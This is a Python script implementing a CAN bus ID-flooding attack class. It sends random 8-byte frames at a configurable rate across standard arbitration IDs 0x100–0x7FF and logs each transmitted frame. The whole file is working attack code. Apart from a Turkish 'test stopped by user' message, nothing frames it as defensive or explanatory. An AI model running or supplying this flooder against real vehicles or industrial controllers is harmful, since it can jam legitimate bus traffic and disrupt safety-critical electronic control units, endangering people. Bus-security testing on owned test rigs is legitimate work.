import time
import can
import random


class IDFloodingAttack:

    def __init__(
        self,
        can_bus,
        start_id=0x100,
        end_id=0x7FF,
        rate=100,
        duration=10
    ):

        self.can_bus = can_bus
        self.start_id = start_id
        self.end_id = end_id
        self.rate = rate
        self.duration = duration

    def generate_payload(self):

        return bytes(
            random.randint(0, 255)
            for _ in range(8)
        )

    def start(self):

        print("[+] CAN ID Flooding Started")
        print(
            f"[+] ID Range : "
            f"0x{self.start_id:03X} - 0x{self.end_id:03X}"
        )
        print(f"[+] Rate     : {self.rate} msg/sec")

        delay = 1 / self.rate

        start_time = time.time()

        message_count = 0

        current_id = self.start_id

        try:

            while time.time() - start_time < self.duration:

                message = can.Message(
                    arbitration_id=current_id,
                    data=self.generate_payload(),
                    is_extended_id=False
                )

                self.can_bus.send(message)

                print(
                    f"[TX] ID: 0x{current_id:03X} "
                    f"DATA: {message.data.hex().upper()}"
                )

                message_count += 1

                current_id += 1

                if current_id > self.end_id:
                    current_id = self.start_id

                time.sleep(delay)

        except KeyboardInterrupt:

            print("\n[!] Test user tarafından durduruldu.")

        finally:

            print("[+] CAN ID Flooding Completed")
            print(
                f"[+] Total Messages Sent: {message_count}"
            )